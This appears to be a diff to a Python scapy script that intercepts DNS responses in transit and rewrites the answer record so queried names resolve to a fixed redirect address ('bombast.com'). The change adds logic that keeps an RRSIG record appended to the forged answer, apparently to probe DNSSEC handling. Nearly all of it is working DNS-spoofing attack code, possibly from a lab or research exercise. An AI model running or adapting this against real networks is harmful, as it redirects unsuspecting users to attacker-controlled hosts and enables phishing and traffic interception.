@@ -23,14 +23,14 @@ def modify(packet):
     if scapy_pkt.haslayer(DNSRR):
         # If the packet is a DNS Resource Record (DNS reply)
         # Modify the packet
-        print("[Before]:", scapy_pkt[DNS].an, scapy_pkt[IP].src, scapy_pkt[IP].dst)
+        print("[Before]:", scapy_pkt[DNS].an)
         try:
             scapy_pkt = changeToBombast(scapy_pkt)
         except IndexError:
             # Not UDP packet, this can be IPerror/UDPerror packets
             pass
 
-        print("[After]: ", scapy_pkt[DNS].an, scapy_pkt[IP].src, scapy_pkt[IP].dst)
+        print("[After]: ", scapy_pkt[DNS].an)
 
         # Set the packet content to our modified version
         packet.set_payload(bytes(scapy_pkt))
@@ -55,11 +55,15 @@ def changeToBombast(scapy_pkt):
 
         return scapy_pkt
 
-    # Craft new answer, overriding the original
-    # Setting the rdata for the IP we want to redirect (bombast.com)
-    scapy_pkt[DNS].an = DNSRR(rrname=qname, type=1, rclass=1, ttl=604800, rdata=BOMBAST_ADDR)
-    # Set the answer count to 1
-    scapy_pkt[DNS].ancount = 1
+    # Craft new answer
+    if scapy_pkt[DNS].ancount > 1:
+        # Packet has RRSIG, store for later
+        rrsig_answer = scapy_pkt.an[1]
+        # Set the rdata for the IP we want to redirect (bombast.com) with RRSIG on the end
+        scapy_pkt[DNS].an = DNSRR(rrname=qname, type=1, rclass=1, ttl=604800, rdata=BOMBAST_ADDR)/rrsig_answer
+    else:
+        # Set the rdata for the IP we want to redirect (bombast.com)
+        scapy_pkt[DNS].an = DNSRR(rrname=qname, type=1, rclass=1, ttl=604800, rdata=BOMBAST_ADDR)
 
     # Delete checksums and length of packet, because we have modified the packet
     # New calculations are required (scapy will do automatically)
